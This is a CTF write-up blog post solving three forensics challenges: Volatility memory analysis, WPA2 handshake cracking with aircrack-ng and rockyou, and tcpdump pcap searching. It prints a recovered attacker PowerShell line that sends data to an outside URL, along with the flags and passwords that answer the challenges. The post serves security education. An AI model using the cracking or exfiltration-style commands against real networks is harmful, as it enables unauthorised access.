---
layout: post
title: "CTF7E4 - Forensics Challenges"
categories: CTF7E4
---
## 1. voila
&nbsp;
**Challenge Description:**{: style="color: red"}
We got this memory dump from another company and they need some little help from us to identify what commands has attacker executed on their system.

&nbsp;

> **→ tar -xzvf voila.tar.gz**{: style="color: red"}                       
voila.elf

&nbsp;

There are many awesome tools for memory forensics, but one that is mainly used from infosec people is [Volatility](https://github.com/volatilityfoundation/volatility) beacuse it's open source and it has different plugins. Before going deeper into analyzing the extracted elf file, we should determine the profile with the **imageinfo** paramter.
&nbsp;

> **→ volatility -f voila.elf imageinfo**{: style="color: red"}        

```
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemory (Kernel AS)
                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/tmp/voiila/voila.elf)
                      PAE type : No PAE
                           DTB : 0x185000L
                          KDBG : 0x82956c28L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82957c00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2020-01-30 14:14:07 UTC+0000
     Image local date and time : 2020-01-30 15:14:07 +0100
```
&nbsp;
Now that we know it's a Windows7SP1 image and that we should look for malicious cmd/powershell commands, we can use the **cmdscan** plugin.

> **→ volatility -f voila.elf --profile=Win7SP1x86 cmdscan**{: style="color: red"}

```
Volatility Foundation Volatility Framework 2.6.1
**************************************************
CommandProcess: conhost.exe Pid: 876
CommandHistory: 0x3c64c0 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x5c
Cmd #0 @ 0x3ca738: Invoke-WebRequest -Uri "https://ctf.xor.al/?flag=XOR{m3m_Forens1cs}"
Cmd #4 @ 0x300034: ?
Cmd #17 @ 0x300031: ?
```

&nbsp;
&nbsp;
## 2. WPA2
&nbsp;
**Challenge Description:**{: style="color: red"}
A greyhat hacker sent us the cap files of attacker's Wi-Fi but we can't crack them. If you manage to crack the password  please submit it base64 encoded. 
- e.x flag: **XOR{base64-value-of-password}**

&nbsp;
> **→ unzip capfiles.zip**{: style="color: red"}

```
Archive:  capfiles.zip
   creating: capfiles/
[capfiles.zip] capfiles/spk-01.cap password: xor2020
  inflating: capfiles/spk-01.cap     
  inflating: capfiles/spk-01.kismet.csv  
  inflating: capfiles/spk-01.csv     
  inflating: capfiles/spk-01.kismet.netxml  
  inflating: capfiles/spk-01.log.csv  
```
&nbsp;
> **→ aircrack-ng spk-01.cap -w ~/tools/SecLists/Passwords/rockyou.txt**{: style="color: red"}

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/wpa.png){:.images}
&nbsp;
KEY FOUND! [ newpass1 ]
&nbsp;
> **→ echo -n 'newpass1' | base64**{: style="color: red"}
bmV3cGFzczE=


Flag: XOR{bmV3cGFzczE=}

&nbsp;
&nbsp;
## 3. sh4rk
&nbsp;
**Challenge Description:**{: style="color: red"}
We detected suspicious traffic in our infrastructure. Could you identify what the attacker has been searching for?

&nbsp;
> **→ unzip sh4rk.zip**{: style="color: red"}

```
Archive:  sh4rk.zip
[sh4rk.zip] traffic.pcap password: xor2020
  inflating: traffic.pcap 
```
&nbsp;

> **→ tcpdump -qns 0 -A -r traffic.pcap \| grep flag**{: style="color: red"}

```
reading from file traffic.pcap, link-type EN10MB (Ethernet)
Q.KUQ.KU<a href="https://controlc.com/53918d7c">flag</a>
```
&nbsp;

The note pasted on controlc.com/53918d7c was password protected. We can look again for a password string in the pcap file.

> **→ tcpdump -qns 0 -A -r traffic.pcap \| grep pass**{: style="color: red"}

```
reading from file traffic.pcap, link-type EN10MB (Ethernet)
<title>Directory listing for /XOR/wireshark/?pass=xor2020</title>
```

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/wireshark.png){:.images}
&nbsp;

&nbsp;
I hope you had fun solving these challenges and learning something new.